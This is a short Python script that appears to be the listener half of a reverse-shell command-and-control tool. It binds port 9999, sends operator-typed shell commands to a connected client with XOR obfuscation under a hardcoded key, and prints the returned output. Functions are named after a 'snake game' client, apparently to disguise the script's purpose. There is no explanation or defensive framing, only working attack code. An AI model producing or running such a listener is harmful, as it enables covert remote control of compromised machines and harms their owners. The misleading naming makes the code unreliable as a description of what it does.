import socket

ENCRYPTION_KEY = b'secretkey'
PORT = 9999

def xor_encode(message, key):
    return bytes([byte ^ key[index % len(key)] for index, byte in enumerate(message)])

def handle_snake_game_client(connection):
    try:
        while True:
            command = input("Enter command: ")
            if not command:
                continue

            command_data = xor_encode(command.encode(), ENCRYPTION_KEY)
            connection.send(command_data)

            if command.lower() == 'exit':
                break

            output_data = connection.recv(65536)
            output = xor_encode(output_data, ENCRYPTION_KEY).decode(errors='ignore')
            print(f"Output:\n{output}")

    except Exception as error:
        print(f"Error: {error}")
    finally:
        connection.close()

def create_server_socket():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(('0.0.0.0', PORT))
    server_socket.listen(1)
    return server_socket

def accept_and_handle_client(server_socket):
    connection, address = server_socket.accept()
    print(f"Accepted connection from {address[0]}:{address[1]}")
    handle_snake_game_client(connection)

def run_server():
    server_socket = create_server_socket()
    print("Server listening on port 9999 ...")

    while True:
        accept_and_handle_client(server_socket)

if __name__ == "__main__":
    run_server()
